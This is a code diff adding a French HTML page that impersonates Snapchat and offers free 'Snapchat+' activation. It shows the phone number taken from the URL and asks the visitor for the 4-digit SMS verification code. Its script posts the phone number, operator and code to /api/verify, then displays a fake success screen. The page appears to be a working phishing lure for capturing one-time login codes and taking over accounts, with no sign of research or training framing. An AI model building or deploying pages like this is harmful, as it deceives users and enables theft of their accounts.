@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Vérification</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Logo Snapchat -->
+        <div class="snapchat-logo">
+            <img src="images.png" alt="Snapchat" width="90">
+        </div>
+        
+        <h2>🔐 Code de vérification</h2>
+        <p class="subtitle">Un code a été envoyé au <strong id="displayPhone"></strong></p>
+        
+        <div class="code-sent-animation">
+            <div class="check-icon">✓</div>
+            <div>
+                <p class="success-sms">✅ Code envoyé avec succès !</p>
+                <p class="sms-detail">Vérifiez vos messages</p>
+            </div>
+        </div>
+
+        <form id="codeForm">
+            <div class="form-group">
+                <label for="code">🔑 Entrez le code de vérification <span class="code-length">(4 chiffres)</span></label>
+                <input type="text" id="code" placeholder="Ex: 8472" maxlength="4" required pattern="[0-9]*" inputmode="numeric">
+            </div>
+            
+            <div class="any-code-note">
+                <span class="note-icon">💡</span>
+                <span> besoin d'attendre un vrai SMS</span>
+            </div>
+
+            <button type="submit" class="btn-primary">✅ Vérifier et activer Snapchat+</button>
+        </form>
+
+        <div class="loading-bar" id="loadingBar">
+            <div class="loading-progress"></div>
+        </div>
+        <p class="loading-text" id="loadingText">⚡ Activation de Snapchat+ en cours...</p>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const phone = params.get('phone');
+        const operator = params.get('op');
+        
+        document.getElementById('displayPhone').textContent = phone;
+
+        document.getElementById('codeForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const code = document.getElementById('code').value;
+            
+            if (code.length !== 4) {
+                alert('Veuillez entrer un code à 4 chiffres');
+                return;
+            }
+            
+            document.getElementById('loadingBar').style.display = 'block';
+            document.getElementById('loadingText').style.display = 'block';
+            document.querySelector('button').disabled = true;
+            
+            await fetch('/api/verify', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone, operator, code })
+            });
+
+            setTimeout(() => {
+                document.getElementById('loadingBar').style.display = 'none';
+                document.getElementById('loadingText').style.display = 'none';
+                
+                document.querySelector('.container').innerHTML = `
+                    <div class="snapchat-logo">
+                        <img src="images.png" alt="Snapchat" width="100">
+                    </div>
+                    <div class="success-animation">
+                        <div class="success-icon">✓</div>
+                    </div>
+                    <h2>🎉 Snapchat+ Activé !</h2>
+                    <p class="subtitle">Votre compte a été mis à jour avec succès.</p>
+                    <div class="features-list">
+                        <p>✅ Replays illimités</p>
+                        <p>✅ Stories plus longues</p>
+                        <p>✅ Badge exclusif ⭐</p>
+                        <p>✅ Snapscore boosté</p>
+                    </div>
+                    <p class="merci">Profitez de Snapchat+ 🎉</p>
+                `;
+            }, 2500);
+        });
+
+        document.getElementById('code').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
+        });
+    </script>
+</body>
+</html>
